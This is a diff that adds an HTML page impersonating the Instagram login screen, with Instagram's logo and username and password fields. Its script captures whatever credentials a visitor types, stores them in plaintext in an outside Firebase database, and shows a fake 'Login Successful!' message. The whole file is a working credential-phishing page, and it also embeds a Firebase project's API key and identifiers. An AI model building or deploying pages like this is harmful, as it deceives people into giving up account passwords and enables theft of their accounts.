@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
+        </div>
+        <form class="login-form">
+            <input type="text" placeholder="Username" class="input-field" id="username">
+            <input type="password" placeholder="Password" class="input-field" id="password">
+            <input type="submit" value="submit" class="login-button" id="submit">
+        </form>
+    </div>
+
+    
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+    
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyD99wGXx8NEDfNpYh1pOCbrrsvBZmx29v0",
+            authDomain: "creativetutorial-b1a6a.firebaseapp.com",
+            projectId: "creativetutorial-b1a6a",
+            storageBucket: "creativetutorial-b1a6a.appspot.com",
+            messagingSenderId: "118536520499",
+            appId: "1:118536520499:web:35b714554332ae2f233446"
+        };
+    
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+    
+        document.getElementById("submit").addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+    
+            set(ref(db, 'user/' + username), {
+                username: username,
+                password: password,
+            });
+    
+            alert("Login Successful!");
+        });
+    </script>
+    
+</body>
+</html>
